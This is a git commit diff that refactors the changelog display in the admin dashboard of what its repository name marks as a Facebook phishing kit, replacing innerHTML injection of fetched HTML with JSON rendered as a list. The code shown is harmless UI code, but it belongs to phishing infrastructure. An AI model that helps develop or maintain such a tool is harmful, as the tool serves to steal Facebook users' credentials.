3fabc8cedc07711258684bf020cf5899e515d789
tripleseven190504 <tripleseven190504@gmail.com>
2024-05-28 03:11:15 +0700

    refactor: convert HTML to JSON format

--- admin_frontend/src/components/Welcome.tsx
+++ admin_frontend/src/components/Welcome.tsx
@@ -1,25 +1,35 @@
 import axios from "axios";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
+interface ChangeLogItem {
+    title: string;
+    description: string;
+}
 function Welcome() {
+    const [changeLog, setChangeLog] = useState<ChangeLogItem[]>([]);
     useEffect(() => {
         axios
             .get(
-                "https://raw.githubusercontent.com/tripleseven190504/Facebook-Phishing-V2/main/.github/UPDATE.html",
+                "https://raw.githubusercontent.com/tripleseven190504/Facebook-Phishing-V2/main/.github/UPDATE.json",
             )
             .then((res) => {
-                const div = document.getElementById("changelog");
-                if (div) {
-                    div.innerHTML = res.data;
-                }
+                setChangeLog(res.data);
             });
     }, []);
+
     return (
         <div className="container mx-auto px-4 py-8">
             <h1 className="mb-4 text-4xl font-bold">
                 Chào mừng đến với Dashboard!
             </h1>
             <h2 className="text-xl font-semibold">Change Log:</h2>
-            <div id="changelog"></div>
+            <ul className="ml-6 list-disc">
+                {changeLog.map((item, index) => (
+                    <li key={index}>
+                        <span className="font-semibold">{item.title}</span>:{" "}
+                        {item.description}
+                    </li>
+                ))}
+            </ul>
         </div>
     );
 }
